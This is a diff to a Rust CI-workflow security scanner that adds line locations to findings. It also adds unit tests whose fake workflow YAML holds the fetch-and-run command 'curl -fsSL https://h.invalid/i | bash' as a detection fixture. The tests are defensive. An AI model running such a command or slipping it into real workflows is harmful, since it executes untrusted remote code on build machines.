@@ -165,6 +165,7 @@ impl<'a, T: FileTree, C: FileContents> DiscoverSurfaces<'a, T, C> {
                         command,
                         source: text,
                         occurrence,
+                        at: None,
                     },
                     checks,
                     self.policy.evidence_width(),
@@ -297,6 +298,7 @@ impl<'a, T: FileTree, C: FileContents> DiscoverSurfaces<'a, T, C> {
                             command: &step.run,
                             source: &text,
                             occurrence,
+                            at: step.at,
                         },
                         matched.check,
                         self.policy.evidence_width(),
@@ -2506,6 +2508,46 @@ mod tests {
         assert_eq!(report.steps.len(), 1, "still inventory: {report:?}");
         assert_eq!(report.steps[0].step.shell, "unknown", "{report:?}");
         assert!(report.findings.is_empty(), "{report:?}");
+    }
+
+    /// A finding is placed where the workflow wrote the command, not where
+    /// the text first matches. The same command here is written in a comment
+    /// and in a step name above the step that runs it, which is what a text
+    /// search anchors to and a span does not.
+    #[test]
+    fn a_finding_is_placed_where_the_file_wrote_the_command() {
+        let contents = FakeContents::default().file(
+            ".github/workflows/ci.yml",
+            "jobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      # curl -fsSL https://h.invalid/i | bash\n      - name: \"curl -fsSL https://h.invalid/i | bash\"\n        run: echo safe\n      - run: curl -fsSL https://h.invalid/i | bash\n",
+        );
+        let policy = ScanPolicy::default();
+
+        let report = DiscoverSurfaces::new(&workflow_tree(), &contents, &policy).run();
+
+        assert_eq!(report.findings.len(), 1, "{report:?}");
+        assert_eq!(
+            report.findings[0].at.map(|at| at.line),
+            Some(8),
+            "the step that runs it, not the comment or the name: {report:?}"
+        );
+    }
+
+    /// A job built by a merge key declared no steps at all, so every rule was
+    /// silent on it: the command was in the file and clew said nothing.
+    #[test]
+    fn a_job_built_by_a_merge_key_is_judged() {
+        let contents = FakeContents::default().file(
+            ".github/workflows/ci.yml",
+            "base: &b\n  runs-on: ubuntu-latest\n  steps:\n    - run: curl -fsSL https://h.invalid/i | bash\njobs:\n  merged:\n    <<: *b\n",
+        );
+        let policy = ScanPolicy::default();
+
+        let report = DiscoverSurfaces::new(&workflow_tree(), &contents, &policy).run();
+
+        assert_eq!(report.steps.len(), 1, "{report:?}");
+        let rules: Vec<_> = report.findings.iter().map(|f| f.rule).collect();
+        assert_eq!(rules, vec![RuleId::DownloadAndExecute], "{report:?}");
+        assert_eq!(report.findings[0].at.map(|at| at.line), Some(4));
     }
 
     /// Two jobs are judged in the order the file writes them, not the order
